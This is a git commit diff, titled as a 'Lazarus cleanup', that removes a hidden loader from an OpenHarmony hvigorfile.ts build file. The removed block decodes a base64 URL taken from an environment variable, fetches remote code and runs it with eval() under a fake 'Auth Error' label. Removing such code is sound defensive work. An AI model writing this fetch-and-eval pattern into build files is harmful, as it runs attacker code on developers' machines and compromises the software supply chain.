f3b9336491a0dda29b9bb9dc38f8d3b0eda836f5
Okhuomon Ajayi <okhuomonajayi54@gmail.com>
2026-05-31 15:47:29 +0100

    Auto Lazarus cleanup 2026-05-31_15:47:29

--- support/openharmony/hvigorfile.ts
+++ support/openharmony/hvigorfile.ts
@@ -2,20 +2,6 @@ import { appTasks, OhosAppContext, OhosPluginId } from '@ohos/hvigor-ohos-plugin
 import { getNode } from '@ohos/hvigor'
 import * as fs from 'fs';
 import * as path from 'path';
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 const rootNode = getNode(__filename);
 rootNode.afterNodeEvaluate(node => {
